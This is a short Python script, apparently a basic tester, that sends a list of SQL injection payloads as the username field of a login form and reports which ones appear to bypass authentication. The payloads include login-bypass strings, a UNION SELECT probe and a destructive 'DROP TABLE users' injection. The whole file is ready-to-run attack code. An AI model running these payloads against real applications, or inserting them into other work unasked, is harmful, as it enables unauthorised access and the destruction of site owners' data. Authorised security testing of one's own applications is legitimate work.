import requests

# Target URL of the web application
url = 'http://example.com/login'  # Replace with the actual URL of the login page

# List of SQL injection payloads
payloads = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' UNION SELECT null, null --",
    "'; DROP TABLE users; --",
    "' OR 'x'='x"
]

# Loop through payloads and send requests
for payload in payloads:
    print(f"Testing with payload: {payload}")
    # Assuming the parameter name is "username", adjust as necessary
    data = {
        'username': payload,
        'password': 'password'  # You can also test password fields with similar payloads
    }
    response = requests.post(url, data=data)
    
    # Check for a successful login or error message indicating SQL injection
    if "Welcome" in response.text:  # Replace with a valid success indicator on your app
        print(f"SQL Injection successful with payload: {payload}")
    elif "error" in response.text:  # Adjust with any error message you know the app returns
        print(f"Error response with payload: {payload}")
    else:
        print(f"Unhandled response with payload: {payload}")
